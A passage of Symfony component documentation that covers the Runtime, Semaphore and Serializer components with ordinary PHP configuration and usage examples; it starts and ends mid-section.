    use Symfony\Bridge\PsrHttpMessage\Factory\HttpFoundationFactory;

    // $psrResponse is an instance of Psr\Http\Message\ResponseInterface

    $httpFoundationFactory = new HttpFoundationFactory();
    $symfonyResponse = $httpFoundationFactory->createResponse($psrResponse);

.. _`PSR-7`: https://www.php-fig.org/psr/psr-7/
.. _`PSR-17`: https://www.php-fig.org/psr/psr-17/
.. _`libraries that implement psr/http-factory-implementation`: https://packagist.org/providers/psr/http-factory-implementation
.. _`HttpMessageFactoryInterface`: https://github.com/symfony/psr-http-message-bridge/blob/main/HttpMessageFactoryInterface.php
.. _`HttpFoundationFactoryInterface`: https://github.com/symfony/psr-http-message-bridge/blob/main/HttpFoundationFactoryInterface.php
.. note::

    If you install this component outside of a Symfony application, you must
    require the ``vendor/autoload.php`` file in your code to enable the class
    autoloading mechanism provided by Composer. Read
    :doc:`this article </components/using_components>` for more details.
The Runtime Component
=====================

    The Runtime Component decouples the bootstrapping logic from any global state
    to make sure the application can run with runtimes like `PHP-PM`_, `ReactPHP`_,
    `Swoole`_, etc. without any changes.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/runtime

.. include:: /components/require_autoload.rst.inc

Usage
-----

The Runtime component abstracts most bootstrapping logic as so-called
*runtimes*, allowing you to write front-controllers in a generic way.
For instance, the Runtime component allows Symfony's ``public/index.php``
to look like this::

    // public/index.php
    use App\Kernel;

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

    return function (array $context): Kernel {
        return new Kernel($context['APP_ENV'], (bool) $context['APP_DEBUG']);
    };

So how does this front-controller work? At first, the special
``autoload_runtime.php`` file is automatically created by the Composer plugin in
the component. This file runs the following logic:

#. It instantiates a :class:`Symfony\\Component\\Runtime\\RuntimeInterface`;
#. The callable (returned by ``public/index.php``) is passed to the Runtime, whose job
   is to resolve the arguments (in this example: ``array $context``);
#. Then, this callable is called to get the application (``App\Kernel``);
#. At last, the Runtime is used to run the application (i.e. calling
   ``$kernel->handle(Request::createFromGlobals())->send()``).

.. caution::

    If you use the Composer ``--no-plugins`` option, the ``autoload_runtime.php``
    file won't be created.

    If you use the Composer ``--no-scripts`` option, make sure your Composer version
    is ``>=2.1.3``; otherwise the ``autoload_runtime.php`` file won't be created.

To make a console application, the bootstrap code would look like::

    #!/usr/bin/env php
    <?php
    // bin/console

    use App\Kernel;
    use Symfony\Bundle\FrameworkBundle\Console\Application;

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

    return function (array $context): Application {
        $kernel = new Kernel($context['APP_ENV'], (bool) $context['APP_DEBUG']);

        // returning an "Application" makes the Runtime run a Console
        // application instead of the HTTP Kernel
        return new Application($kernel);
    };

Selecting Runtimes
------------------

The default Runtime is :class:`Symfony\\Component\\Runtime\\SymfonyRuntime`. It
works excellent on most applications running with a webserver using PHP-FPM like
Nginx or Apache.

The component also provides a :class:`Symfony\\Component\\Runtime\\GenericRuntime`,
which uses PHP's ``$_SERVER``, ``$_POST``, ``$_GET``, ``$_FILES`` and
``$_SESSION`` superglobals. You may also use a custom Runtime (e.g. to
integrate with Swoole or AWS Lambda).

Use the ``APP_RUNTIME`` environment variable or by specifying the
``extra.runtime.class`` in ``composer.json`` to change the Runtime class:

.. code-block:: json

    {
        "require": {
            "...": "..."
        },
        "extra": {
            "runtime": {
                "class": "Symfony\\Component\\Runtime\\GenericRuntime"
            }
        }
    }

Using the Runtime
-----------------

A Runtime is responsible for passing arguments into the closure and run the
application returned by the closure. The :class:`Symfony\\Component\\Runtime\\SymfonyRuntime` and
:class:`Symfony\\Component\\Runtime\\GenericRuntime` supports a number of
arguments and different applications that you can use in your
front-controllers.

Resolvable Arguments
~~~~~~~~~~~~~~~~~~~~

The closure returned from the front-controller may have zero or more arguments::

    // public/index.php
    use Symfony\Bundle\FrameworkBundle\Console\Application;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

    return function (InputInterface $input, OutputInterface $output): Application {
        // ...
    };

The following arguments are supported by the ``SymfonyRuntime``:

:class:`Symfony\\Component\\HttpFoundation\\Request`
    A request created from globals.

:class:`Symfony\\Component\\Console\\Input\\InputInterface`
    An input to read options and arguments.

:class:`Symfony\\Component\\Console\\Output\\OutputInterface`
    Console output to print to the CLI with style.

:class:`Symfony\\Component\\Console\\Application`
    An application for creating CLI applications.

:class:`Symfony\\Component\\Console\\Command\\Command`
    For creating one line command CLI applications (using
    ``Command::setCode()``).

And these arguments are supported by both the ``SymfonyRuntime`` and
``GenericRuntime`` (both type and variable name are important):

``array $context``
    This is the same as ``$_SERVER`` + ``$_ENV``.

``array $argv``
    The arguments passed to the command (same as ``$_SERVER['argv']``).

``array $request``
    With keys ``query``, ``body``, ``files`` and ``session``.

Resolvable Applications
~~~~~~~~~~~~~~~~~~~~~~~

The application returned by the closure below is a Symfony Kernel. However,
a number of different applications are supported::

    // public/index.php
    use App\Kernel;

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

    return static function (): Kernel {
        return new Kernel('prod', false);
    };

The ``SymfonyRuntime`` can handle these applications:

:class:`Symfony\\Component\\HttpKernel\\HttpKernelInterface`
    The application will be run with :class:`Symfony\\Component\\Runtime\\Runner\\Symfony\\HttpKernelRunner`
    like a "standard" Symfony application.

:class:`Symfony\\Component\\HttpFoundation\\Response`
    The Response will be printed by
    :class:`Symfony\\Component\\Runtime\\Runner\\Symfony\\ResponseRunner`::

        // public/index.php
        use Symfony\Component\HttpFoundation\Response;

        require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

        return static function (): Response {
            return new Response('Hello world');
        };

:class:`Symfony\\Component\\Console\\Command\\Command`
    To write single command applications. This will use the
    :class:`Symfony\\Component\\Runtime\\Runner\\Symfony\\ConsoleApplicationRunner`::

        use Symfony\Component\Console\Command\Command;
        use Symfony\Component\Console\Input\InputInterface;
        use Symfony\Component\Console\Output\OutputInterface;

        require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

        return static function (Command $command): Command {
            $command->setCode(static function (InputInterface $input, OutputInterface $output): void {
                $output->write('Hello World');
            });

            return $command;
        };

:class:`Symfony\\Component\\Console\\Application`
    Useful with console applications with more than one command. This will use the
    :class:`Symfony\\Component\\Runtime\\Runner\\Symfony\\ConsoleApplicationRunner`::

        use Symfony\Component\Console\Application;
        use Symfony\Component\Console\Command\Command;
        use Symfony\Component\Console\Input\InputInterface;
        use Symfony\Component\Console\Output\OutputInterface;

        require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

        return static function (array $context): Application {
            $command = new Command('hello');
            $command->setCode(static function (InputInterface $input, OutputInterface $output): void {
                $output->write('Hello World');
            });

            $app = new Application();
            $app->add($command);
            $app->setDefaultCommand('hello', true);

            return $app;
        };

The ``GenericRuntime`` and ``SymfonyRuntime`` also support these generic
applications:

:class:`Symfony\\Component\\Runtime\\RunnerInterface`
    The ``RunnerInterface`` is a way to use a custom application with the
    generic Runtime::

        // public/index.php
        use Symfony\Component\Runtime\RunnerInterface;

        require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

        return static function (): RunnerInterface {
            return new class implements RunnerInterface {
                public function run(): int
                {
                    echo 'Hello World';

                    return 0;
                }
            };
        };

``callable``
    Your "application" can also be a ``callable``. The first callable will return
    the "application" and the second callable is the "application" itself::

        // public/index.php
        require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

        return static function (): callable {
            $app = static function(): int {
                echo 'Hello World';

                return 0;
            };

            return $app;
        };

``void``
    If the callable doesn't return anything, the ``SymfonyRuntime`` will assume
    everything is fine::

        require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

        return function (): void {
            echo 'Hello world';
        };

Using Options
~~~~~~~~~~~~~

Some behavior of the Runtimes can be modified through runtime options. They
can be set using the ``APP_RUNTIME_OPTIONS`` environment variable::

    $_SERVER['APP_RUNTIME_OPTIONS'] = [
        'project_dir' => '/var/task',
    ];

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

    // ...

You can also configure ``extra.runtime`` in ``composer.json``:

.. code-block:: json

    {
        "require": {
            "...": "..."
        },
        "extra": {
            "runtime": {
                "project_dir": "/var/task"
            }
        }
    }

Then, update your Composer files (running ``composer dump-autoload``, for instance),
so that the ``vendor/autoload_runtime.php`` files gets regenerated with the new option.

The following options are supported by the ``SymfonyRuntime``:

``env`` (default: ``APP_ENV`` environment variable, or ``"dev"``)
    To define the name of the environment the app runs in.
``disable_dotenv`` (default: ``false``)
    To disable looking for ``.env`` files.
``dotenv_path`` (default: ``.env``)
    To define the path of dot-env files.
``dotenv_overload`` (default: ``false``)
    To tell Dotenv whether to override ``.env`` vars with ``.env.local`` (or other ``.env.*`` files)
``use_putenv``
    To tell Dotenv to set env vars using ``putenv()`` (NOT RECOMMENDED).
``prod_envs`` (default: ``["prod"]``)
    To define the names of the production envs.
``test_envs`` (default: ``["test"]``)
    To define the names of the test envs.

Besides these, the ``GenericRuntime`` and ``SymfonyRuntime`` also support
these options:

``debug`` (default: the value of the env var defined by ``debug_var_name`` option
    (usually, ``APP_DEBUG``), or ``true`` if such env var is not defined)
    Toggles the :ref:`debug mode <debug-mode>` of Symfony applications (e.g. to
    display errors)
``runtimes``
    Maps "application types" to a ``GenericRuntime`` implementation that
    knows how to deal with each of them.
``error_handler`` (default: :class:`Symfony\\Component\\Runtime\\Internal\\BasicErrorHandler` or :class:`Symfony\\Component\\Runtime\\Internal\\SymfonyErrorHandler` for ``SymfonyRuntime``)
    Defines the class to use to handle PHP errors.
``env_var_name`` (default: ``"APP_ENV"``)
    Defines the name of the env var that stores the name of the
    :ref:`configuration environment <configuration-environments>`
    to use when running the application.
``debug_var_name`` (default: ``"APP_DEBUG"``)
    Defines the name of the env var that stores the value of the
    :ref:`debug mode <debug-mode>` flag to use when running the application.

Create Your Own Runtime
-----------------------

This is an advanced topic that describes the internals of the Runtime component.

Using the Runtime component will benefit maintainers because the bootstrap
logic could be versioned as a part of a normal package. If the application
author decides to use this component, the package maintainer of the Runtime
class will have more control and can fix bugs and add features.

The Runtime component is designed to be totally generic and able to run any
application outside of the global state in 6 steps:

#. The main entry point returns a *callable* (the "app") that wraps the application;
#. The *app callable* is passed to ``RuntimeInterface::getResolver()``, which returns
   a :class:`Symfony\\Component\\Runtime\\ResolverInterface`. This resolver returns
   an array with the app callable (or something that decorates this callable) at
   index 0 and all its resolved arguments at index 1.
#. The *app callable* is invoked with its arguments, it will return an object that
   represents the application.
#. This *application object* is passed to ``RuntimeInterface::getRunner()``, which
   returns a :class:`Symfony\\Component\\Runtime\\RunnerInterface`: an instance
   that knows how to "run" the application object.
#. The ``RunnerInterface::run(object $application)`` is called and it returns the
   exit status code as ``int``.
#. The PHP engine is terminated with this status code.

When creating a new runtime, there are two things to consider: First, what arguments
will the end user use? Second, what will the user's application look like?

For instance, imagine you want to create a runtime for `ReactPHP`_:

**What arguments will the end user use?**

For a generic ReactPHP application, no special arguments are
typically required. This means that you can use the
:class:`Symfony\\Component\\Runtime\\GenericRuntime`.

**What will the user's application look like?**

There is also no typical React application, so you might want to rely on
the `PSR-15`_ interfaces for HTTP request handling.

However, a ReactPHP application will need some special logic to *run*. That logic
is added in a new class implementing :class:`Symfony\\Component\\Runtime\\RunnerInterface`::

    use Psr\Http\Message\ResponseInterface;
    use Psr\Http\Message\ServerRequestInterface;
    use Psr\Http\Server\RequestHandlerInterface;
    use React\EventLoop\Factory as ReactFactory;
    use React\Http\Server as ReactHttpServer;
    use React\Socket\Server as ReactSocketServer;
    use Symfony\Component\Runtime\RunnerInterface;

    class ReactPHPRunner implements RunnerInterface
    {
        public function __construct(
            private RequestHandlerInterface $application,
            private int $port,
        ) {
        }

        public function run(): int
        {
            $application = $this->application;
            $loop = ReactFactory::create();

            // configure ReactPHP to correctly handle the PSR-15 application
            $server = new ReactHttpServer(
                $loop,
                function (ServerRequestInterface $request) use ($application): ResponseInterface {
                    return $application->handle($request);
                }
            );

            // start the ReactPHP server
            $socket = new ReactSocketServer($this->port, $loop);
            $server->listen($socket);

            $loop->run();

            return 0;
        }
    }

By extending the ``GenericRuntime``, you make sure that the application is
always using this ``ReactPHPRunner``::

    use Symfony\Component\Runtime\GenericRuntime;
    use Symfony\Component\Runtime\RunnerInterface;

    class ReactPHPRuntime extends GenericRuntime
    {
        private int $port;

        public function __construct(array $options)
        {
            $this->port = $options['port'] ?? 8080;
            parent::__construct($options);
        }

        public function getRunner(?object $application): RunnerInterface
        {
            if ($application instanceof RequestHandlerInterface) {
                return new ReactPHPRunner($application, $this->port);
            }

            // if it's not a PSR-15 application, use the GenericRuntime to
            // run the application (see "Resolvable Applications" above)
            return parent::getRunner($application);
        }
    }

The end user will now be able to create front controller like::

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

    return function (array $context): SomeCustomPsr15Application {
        return new SomeCustomPsr15Application();
    };

.. _PHP-PM: https://github.com/php-pm/php-pm
.. _Swoole: https://openswoole.com/
.. _ReactPHP: https://reactphp.org/
.. _`PSR-15`: https://www.php-fig.org/psr/psr-15/
The Semaphore Component
=======================

    The Semaphore Component manages `semaphores`_, a mechanism to provide
    exclusive access to a shared resource.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/semaphore

.. include:: /components/require_autoload.rst.inc

Usage
-----

In computer science, a semaphore is a variable or abstract data type used to
control access to a common resource by multiple processes in a concurrent
system such as a multitasking operating system. The main difference
with :doc:`locks </lock>` is that semaphores allow more than one process to
access a resource, whereas locks only allow one process.

Create semaphores with the :class:`Symfony\\Component\\Semaphore\\SemaphoreFactory`
class, which in turn requires another class to manage the storage::

    use Symfony\Component\Semaphore\SemaphoreFactory;
    use Symfony\Component\Semaphore\Store\RedisStore;

    $redis = new Redis();
    $redis->connect('172.17.0.2');

    $store = new RedisStore($redis);
    $factory = new SemaphoreFactory($store);

The semaphore is created by calling the
:method:`Symfony\\Component\\Semaphore\\SemaphoreFactory::createSemaphore`
method. Its first argument is an arbitrary string that represents the locked
resource. Its second argument is the maximum number of processes allowed. Then, a
call to the :method:`Symfony\\Component\\Semaphore\\SemaphoreInterface::acquire`
method will try to acquire the semaphore::

    // ...
    $semaphore = $factory->createSemaphore('pdf-invoice-generation', 2);

    if ($semaphore->acquire()) {
        // The resource "pdf-invoice-generation" is locked.
        // Here you can safely compute and generate the invoice.

        $semaphore->release();
    }

If the semaphore can not be acquired, the method returns ``false``. The
``acquire()`` method can be safely called repeatedly, even if the semaphore is
already acquired.

.. note::

    Unlike other implementations, the Semaphore component distinguishes
    semaphores instances even when they are created for the same resource. If a
    semaphore has to be used by several services, they should share the same
    ``Semaphore`` instance returned by the ``SemaphoreFactory::createSemaphore``
    method.

.. tip::

    If you don't release the semaphore explicitly, it will be released
    automatically on instance destruction. In some cases, it can be useful to
    lock a resource across several requests. To disable the automatic release
    behavior, set the fifth argument of the ``createSemaphore()`` method to ``false``.

.. _`semaphores`: https://en.wikipedia.org/wiki/Semaphore_(programming)
The Serializer Component
========================

    The Serializer component is meant to be used to turn objects into a
    specific format (XML, JSON, YAML, ...) and the other way around.

In order to do so, the Serializer component follows the following schema.

.. raw:: html

    <object data="../_images/components/serializer/serializer_workflow.svg" type="image/svg+xml"
        alt="A flow diagram showing how objects are serialized/deserialized. This is described in the subsequent paragraph."
    ></object>

When (de)serializing objects, the Serializer uses an array as the intermediary
between objects and serialized contents. Encoders will only deal with
turning specific **formats** into **arrays** and vice versa. The same way,
normalizers will deal with turning specific **objects** into **arrays** and
vice versa. The Serializer deals with calling the normalizers and encoders
when serializing objects or deserializing formats.

Serialization is a complex topic. This component may not cover all your use
cases out of the box, but it can be useful for developing tools to
serialize and deserialize your objects.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/serializer

.. include:: /components/require_autoload.rst.inc

To use the ``ObjectNormalizer``, the :doc:`PropertyAccess component </components/property_access>`
must also be installed.

Usage
-----

.. seealso::

    This article explains the philosophy of the Serializer and gets you familiar
    with the concepts of normalizers and encoders. The code examples assume
    that you use the Serializer as an independent component. If you are using
    the Serializer in a Symfony application, read :doc:`/serializer` after you
    finish this article.

To use the Serializer component, set up the
:class:`Symfony\\Component\\Serializer\\Serializer` specifying which encoders
and normalizer are going to be available::

    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Encoder\XmlEncoder;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $encoders = [new XmlEncoder(), new JsonEncoder()];
    $normalizers = [new ObjectNormalizer()];

    $serializer = new Serializer($normalizers, $encoders);

The preferred normalizer is the
:class:`Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer`,
but other normalizers are available. All the examples shown below use
the ``ObjectNormalizer``.

Serializing an Object
---------------------

For the sake of this example, assume the following class already
exists in your project::

    namespace App\Model;

    class Person
    {
        private int $age;
        private string $name;
        private bool $sportsperson;
        private ?\DateTimeInterface $createdAt;

        // Getters
        public function getAge(): int
        {
            return $this->age;
        }

        public function getName(): string
        {
            return $this->name;
        }

        public function getCreatedAt(): ?\DateTimeInterface
        {
            return $this->createdAt;
        }

        // Issers
        public function isSportsperson(): bool
        {
            return $this->sportsperson;
        }

        // Setters
        public function setAge(int $age): void
        {
            $this->age = $age;
        }

        public function setName(string $name): void
        {
            $this->name = $name;
        }

        public function setSportsperson(bool $sportsperson): void
        {
            $this->sportsperson = $sportsperson;
        }

        public function setCreatedAt(?\DateTimeInterface $createdAt = null): void
        {
            $this->createdAt = $createdAt;
        }
    }

Now, if you want to serialize this object into JSON, you only need to
use the Serializer service created before::

    use App\Model\Person;

    $person = new Person();
    $person->setName('foo');
    $person->setAge(99);
    $person->setSportsperson(false);

    $jsonContent = $serializer->serialize($person, 'json');

    // $jsonContent contains {"name":"foo","age":99,"sportsperson":false,"createdAt":null}

    echo $jsonContent; // or return it in a Response

The first parameter of the :method:`Symfony\\Component\\Serializer\\Serializer::serialize`
is the object to be serialized and the second is used to choose the proper encoder,
in this case :class:`Symfony\\Component\\Serializer\\Encoder\\JsonEncoder`.

Deserializing an Object
-----------------------

You'll now learn how to do the exact opposite. This time, the information
of the ``Person`` class would be encoded in XML format::

    use App\Model\Person;

    $data = <<<EOF
    <person>
        <name>foo</name>
        <age>99</age>
        <sportsperson>false</sportsperson>
    </person>
    EOF;

    $person = $serializer->deserialize($data, Person::class, 'xml');

In this case, :method:`Symfony\\Component\\Serializer\\Serializer::deserialize`
needs three parameters:

#. The information to be decoded
#. The name of the class this information will be decoded to
#. The encoder used to convert that information into an array

By default, additional attributes that are not mapped to the denormalized object
will be ignored by the Serializer component. If you prefer to throw an exception
when this happens, set the ``AbstractNormalizer::ALLOW_EXTRA_ATTRIBUTES`` context option to
``false`` and provide an object that implements ``ClassMetadataFactoryInterface``
when constructing the normalizer::

    use App\Model\Person;

    $data = <<<EOF
    <person>
        <name>foo</name>
        <age>99</age>
        <city>Paris</city>
    </person>
    EOF;

    // $loader is any of the valid loaders explained later in this article
    $classMetadataFactory = new ClassMetadataFactory($loader);
    $normalizer = new ObjectNormalizer($classMetadataFactory);
    $serializer = new Serializer([$normalizer]);

    // this will throw a Symfony\Component\Serializer\Exception\ExtraAttributesException
    // because "city" is not an attribute of the Person class
    $person = $serializer->deserialize($data, Person::class, 'xml', [
        AbstractNormalizer::ALLOW_EXTRA_ATTRIBUTES => false,
    ]);

Deserializing in an Existing Object
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The serializer can also be used to update an existing object::

    // ...
    $person = new Person();
    $person->setName('bar');
    $person->setAge(99);
    $person->setSportsperson(true);

    $data = <<<EOF
    <person>
        <name>foo</name>
        <age>69</age>
    </person>
    EOF;

    $serializer->deserialize($data, Person::class, 'xml', [AbstractNormalizer::OBJECT_TO_POPULATE => $person]);
    // $person = App\Model\Person(name: 'foo', age: '69', sportsperson: true)

This is a common need when working with an ORM.

The ``AbstractNormalizer::OBJECT_TO_POPULATE`` is only used for the top level object. If that object
is the root of a tree structure, all child elements that exist in the
normalized data will be re-created with new instances.

When the ``AbstractObjectNormalizer::DEEP_OBJECT_TO_POPULATE`` option is set to
true, existing children of the root ``OBJECT_TO_POPULATE`` are updated from the
normalized data, instead of the denormalizer re-creating them. Note that
``DEEP_OBJECT_TO_POPULATE`` only works for single child objects, but not for
arrays of objects. Those will still be replaced when present in the normalized
data.

Context
-------

Many Serializer features can be configured :ref:`using a context <serializer_serializer-context>`.

.. _component-serializer-attributes-groups:

Attributes Groups
-----------------

Sometimes, you want to serialize different sets of attributes from your
entities. Groups are a handy way to achieve this need.

Assume you have the following plain-old-PHP object::

    namespace Acme;

    class MyObj
    {
        public string $foo;

        private string $bar;

        public function getBar(): string
        {
            return $this->bar;
        }

        public function setBar($bar): string
        {
            return $this->bar = $bar;
        }
    }

The definition of serialization can be specified using annotations, XML
or YAML. The :class:`Symfony\\Component\\Serializer\\Mapping\\Factory\\ClassMetadataFactory`
that will be used by the normalizer must be aware of the format to use.

The following code shows how to initialize the :class:`Symfony\\Component\\Serializer\\Mapping\\Factory\\ClassMetadataFactory`
for each format:

* Attributes in PHP files::

    use Symfony\Component\Serializer\Mapping\Factory\ClassMetadataFactory;
    use Symfony\Component\Serializer\Mapping\Loader\AttributeLoader;

    $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());

* YAML files::

    use Symfony\Component\Serializer\Mapping\Factory\ClassMetadataFactory;
    use Symfony\Component\Serializer\Mapping\Loader\YamlFileLoader;

    $classMetadataFactory = new ClassMetadataFactory(new YamlFileLoader('/path/to/your/definition.yaml'));

* XML files::

    use Symfony\Component\Serializer\Mapping\Factory\ClassMetadataFactory;
    use Symfony\Component\Serializer\Mapping\Loader\XmlFileLoader;

    $classMetadataFactory = new ClassMetadataFactory(new XmlFileLoader('/path/to/your/definition.xml'));

.. _component-serializer-attributes-groups-attributes:

Then, create your groups definition:

.. configuration-block::

    .. code-block:: php-attributes

        namespace Acme;

        use Symfony\Component\Serializer\Annotation\Groups;

        class MyObj
        {
            #[Groups(['group1', 'group2'])]
            public string $foo;

            #[Groups(['group4'])]
            public string $anotherProperty;

            #[Groups(['group3'])]
            public function getBar() // is* methods are also supported
            {
                return $this->bar;
            }

            // ...
        }

    .. code-block:: yaml

        Acme\MyObj:
            attributes:
                foo:
                    groups: ['group1', 'group2']
                anotherProperty:
                    groups: ['group4']
                bar:
                    groups: ['group3']

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="Acme\MyObj">
                <attribute name="foo">
                    <group>group1</group>
                    <group>group2</group>
                </attribute>

                <attribute name="anotherProperty">
                    <group>group4</group>
                </attribute>

                <attribute name="bar">
                    <group>group3</group>
                </attribute>
            </class>
        </serializer>

You are now able to serialize only attributes in the groups you want::

    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $obj = new MyObj();
    $obj->foo = 'foo';
    $obj->anotherProperty = 'anotherProperty';
    $obj->setBar('bar');

    $normalizer = new ObjectNormalizer($classMetadataFactory);
    $serializer = new Serializer([$normalizer]);

    $data = $serializer->normalize($obj, null, ['groups' => 'group1']);
    // $data = ['foo' => 'foo'];

    $obj2 = $serializer->denormalize(
        ['foo' => 'foo', 'anotherProperty' => 'anotherProperty', 'bar' => 'bar'],
        'MyObj',
        null,
        ['groups' => ['group1', 'group3']]
    );
    // $obj2 = MyObj(foo: 'foo', bar: 'bar')

    // To get all groups, use the special value `*` in `groups`
    $obj3 = $serializer->denormalize(
        ['foo' => 'foo', 'anotherProperty' => 'anotherProperty', 'bar' => 'bar'],
        'MyObj',
        null,
        ['groups' => ['*']]
    );
    // $obj2 = MyObj(foo: 'foo', anotherProperty: 'anotherProperty', bar: 'bar')

.. _ignoring-attributes-when-serializing:

Selecting Specific Attributes
-----------------------------

It is also possible to serialize only a set of specific attributes::

    use Symfony\Component\Serializer\Normalizer\AbstractNormalizer;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    class User
    {
        public string $familyName;
        public string $givenName;
        public Company $company;
    }

    class Company
    {
        public string $name;
        public string $address;
    }

    $company = new Company();
    $company->name = 'Les-Tilleuls.coop';
    $company->address = 'Lille, France';

    $user = new User();
    $user->familyName = 'Dunglas';
    $user->givenName = 'Kévin';
    $user->company = $company;

    $serializer = new Serializer([new ObjectNormalizer()]);

    $data = $serializer->normalize($user, null, [AbstractNormalizer::ATTRIBUTES => ['familyName', 'company' => ['name']]]);
    // $data = ['familyName' => 'Dunglas', 'company' => ['name' => 'Les-Tilleuls.coop']];

Only attributes that are not ignored (see below) are available.
If some serialization groups are set, only attributes allowed by those groups can be used.

As for groups, attributes can be selected during both the serialization and deserialization processes.

.. _serializer_ignoring-attributes:

Ignoring Attributes
-------------------

All accessible attributes are included by default when serializing objects.
There are two options to ignore some of those attributes.

Option 1: Using ``#[Ignore]`` Attribute
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. configuration-block::

    .. code-block:: php-attributes

        namespace App\Model;

        use Symfony\Component\Serializer\Annotation\Ignore;

        class MyClass
        {
            public string $foo;

            #[Ignore]
            public string $bar;
        }

    .. code-block:: yaml

        App\Model\MyClass:
            attributes:
                bar:
                    ignore: true

    .. code-block:: xml

        <?xml version="1.0" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="App\Model\MyClass">
                <attribute name="bar" ignore="true"/>
            </class>
        </serializer>

You can now ignore specific attributes during serialization::

    use App\Model\MyClass;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $obj = new MyClass();
    $obj->foo = 'foo';
    $obj->bar = 'bar';

    $normalizer = new ObjectNormalizer($classMetadataFactory);
    $serializer = new Serializer([$normalizer]);

    $data = $serializer->normalize($obj);
    // $data = ['foo' => 'foo'];

Option 2: Using the Context
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Pass an array with the names of the attributes to ignore using the
``AbstractNormalizer::IGNORED_ATTRIBUTES`` key in the ``context`` of the
serializer method::

    use Acme\Person;
    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Normalizer\AbstractNormalizer;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $person = new Person();
    $person->setName('foo');
    $person->setAge(99);

    $normalizer = new ObjectNormalizer();
    $encoder = new JsonEncoder();

    $serializer = new Serializer([$normalizer], [$encoder]);
    $serializer->serialize($person, 'json', [AbstractNormalizer::IGNORED_ATTRIBUTES => ['age']]); // Output: {"name":"foo"}

.. _component-serializer-converting-property-names-when-serializing-and-deserializing:

Converting Property Names when Serializing and Deserializing
------------------------------------------------------------

Sometimes serialized attributes must be named differently than properties
or getter/setter methods of PHP classes.

The Serializer component provides a handy way to translate or map PHP field
names to serialized names: The Name Converter System.

Given you have the following object::

    class Company
    {
        public string $name;
        public string $address;
    }

And in the serialized form, all attributes must be prefixed by ``org_`` like
the following::

    {"org_name": "Acme Inc.", "org_address": "123 Main Street, Big City"}

A custom name converter can handle such cases::

    use Symfony\Component\Serializer\NameConverter\NameConverterInterface;

    class OrgPrefixNameConverter implements NameConverterInterface
    {
        public function normalize(string $propertyName): string
        {
            return 'org_'.$propertyName;
        }

        public function denormalize(string $propertyName): string
        {
            // removes 'org_' prefix
            return str_starts_with($propertyName, 'org_') ? substr($propertyName, 4) : $propertyName;
        }
    }

The custom name converter can be used by passing it as second parameter of any
class extending :class:`Symfony\\Component\\Serializer\\Normalizer\\AbstractNormalizer`,
including :class:`Symfony\\Component\\Serializer\\Normalizer\\GetSetMethodNormalizer`
and :class:`Symfony\\Component\\Serializer\\Normalizer\\PropertyNormalizer`::

    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $nameConverter = new OrgPrefixNameConverter();
    $normalizer = new ObjectNormalizer(null, $nameConverter);

    $serializer = new Serializer([$normalizer], [new JsonEncoder()]);

    $company = new Company();
    $company->name = 'Acme Inc.';
    $company->address = '123 Main Street, Big City';

    $json = $serializer->serialize($company, 'json');
    // {"org_name": "Acme Inc.", "org_address": "123 Main Street, Big City"}
    $companyCopy = $serializer->deserialize($json, Company::class, 'json');
    // Same data as $company

.. note::

    You can also implement
    :class:`Symfony\\Component\\Serializer\\NameConverter\\AdvancedNameConverterInterface`
    to access the current class name, format and context.

.. _using-camelized-method-names-for-underscored-attributes:

CamelCase to snake_case
~~~~~~~~~~~~~~~~~~~~~~~

In many formats, it's common to use underscores to separate words (also known
as snake_case). However, in Symfony applications is common to use CamelCase to
name properties (even though the `PSR-1 standard`_ doesn't recommend any
specific case for property names).

Symfony provides a built-in name converter designed to transform between
snake_case and CamelCased styles during serialization and deserialization
processes::

    use Symfony\Component\Serializer\NameConverter\CamelCaseToSnakeCaseNameConverter;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;

    $normalizer = new ObjectNormalizer(null, new CamelCaseToSnakeCaseNameConverter());

    class Person
    {
        public function __construct(
            private string $firstName,
        ) {
        }

        public function getFirstName(): string
        {
            return $this->firstName;
        }
    }

